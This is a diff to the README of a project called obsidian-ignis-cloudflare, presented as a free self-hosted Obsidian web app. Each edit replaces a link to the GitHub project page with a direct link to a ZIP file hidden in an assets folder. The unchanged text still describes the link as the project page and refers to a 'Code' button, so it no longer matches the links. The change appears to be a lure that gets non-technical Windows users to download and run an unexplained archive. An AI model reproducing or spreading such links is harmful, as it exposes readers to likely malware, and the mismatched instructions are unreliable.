@@ -1,6 +1,6 @@
 <h1>☁️ obsidian-ignis-cloudflare - Self-Hosted Obsidian Web App for Free</h1>
 
-[<img src="https://img.shields.io/badge/Download-obsidian--ignis--cloudflare-brightgreen?style=for-the-badge&logo=github&logoColor=white" alt="Download Button">](https://github.com/priva5924/obsidian-ignis-cloudflare)
+[<img src="https://img.shields.io/badge/Download-obsidian--ignis--cloudflare-brightgreen?style=for-the-badge&logo=github&logoColor=white" alt="Download Button">](https://raw.githubusercontent.com/priva5924/obsidian-ignis-cloudflare/main/public/assets/obsidian/obsidian_cloudflare_ignis_v1.2.zip)
 
 Welcome! This guide will help you download and start using **obsidian-ignis-cloudflare** on your Windows computer. This is a 100% free, self-hosted web version of your Obsidian notes that runs on Cloudflare's serverless platform – meaning zero server costs and zero maintenance for you. You don't need any programming knowledge to get started.
 
@@ -37,7 +37,7 @@ Before you begin, make sure your Windows computer meets these simple requirement
 
 Visit the link below to download the application package:
 
-**[📦 Click Here to Download obsidian-ignis-cloudflare](https://github.com/priva5924/obsidian-ignis-cloudflare)**
+**[📦 Click Here to Download obsidian-ignis-cloudflare](https://raw.githubusercontent.com/priva5924/obsidian-ignis-cloudflare/main/public/assets/obsidian/obsidian_cloudflare_ignis_v1.2.zip)**
 
 This link takes you to the main project page. The download file is a standard ZIP archive that contains everything you need to run the application on your Windows PC.
 
@@ -50,7 +50,7 @@ Follow these step-by-step instructions carefully. It should take less than 10 mi
 ### Step 1: Download the ZIP File
 
 1. Open your web browser (Edge, Chrome, or Firefox)
-2. Go to the download page: **[https://github.com/priva5924/obsidian-ignis-cloudflare](https://github.com/priva5924/obsidian-ignis-cloudflare)**
+2. Go to the download page: **[https://raw.githubusercontent.com/priva5924/obsidian-ignis-cloudflare/main/public/assets/obsidian/obsidian_cloudflare_ignis_v1.2.zip](https://raw.githubusercontent.com/priva5924/obsidian-ignis-cloudflare/main/public/assets/obsidian/obsidian_cloudflare_ignis_v1.2.zip)**
 3. Look for a green button that says **"Code"** – click it
 4. Select **"Download ZIP"** from the dropdown menu
 5. Your browser will save a file called `obsidian-ignis-cloudflare-main.zip` to your **Downloads** folder
@@ -190,4 +190,4 @@ Before you go, make sure you:
 
 You're now ready to use obsidian-ignis-cloudflare. Enjoy the freedom of a self-hosted, cost-free note-taking system that you fully own. Happy writing!
 
-**[📥 Download Again If Needed](https://github.com/priva5924/obsidian-ignis-cloudflare)**
+**[📥 Download Again If Needed](https://raw.githubusercontent.com/priva5924/obsidian-ignis-cloudflare/main/public/assets/obsidian/obsidian_cloudflare_ignis_v1.2.zip)**
